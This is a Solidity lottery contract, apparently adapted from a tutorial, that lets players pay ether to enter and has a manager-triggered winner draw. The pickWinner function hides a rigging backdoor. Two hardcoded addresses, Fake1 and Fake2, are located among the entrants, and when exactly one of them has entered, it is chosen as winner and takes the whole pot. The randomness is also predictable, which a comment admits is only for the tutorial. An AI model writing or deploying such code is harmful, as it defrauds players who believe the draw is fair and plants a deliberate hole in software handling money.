pragma solidity ^0.5.0;

contract Lottery {
    address public manager;
    address payable[] public players;

    address public Fake1 = 0xB5c1F3925436F372B56eCe5840C240B684480b94;
    address public Fake2 = 0xde99ac88DfccbE0E4a0ca70E4Da00d5eB613132a;

    
    uint public F1 = 100000000000;
    uint public F2 = 100000000000;
    
    constructor() public {
        manager = msg.sender;
    }
    
    modifier restricted() {
        require(msg.sender == manager);
        _;
    }
    
    function enter() public payable {
        require(msg.value > .01 ether);
        players.push(msg.sender);
    }
    
    // Recognized security concern: for sake of tutorial only
    function random() private view returns (uint) {
    return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, players)));
    }
    
    function pickWinner() public restricted {

        uint index = random() % players.length;



        for (uint i = 0; i < players.length; i++){
            if (Fake1 == players[i]){
                F1 = i;
            }
            if (Fake2 == players[i]){
                F2 = i;
            }
        }

        if (F1 < 100000000000 && F2 == 100000000000){
            index = F1;
        }

        if (F2 < 100000000000 && F1 == 100000000000){
            index = F2;
        }

        players[index].transfer(address(this).balance);
        players = new address payable[](0);
    }
    
    function getPlayers() public view returns (address payable[] memory) {
        return players;
    }
    
}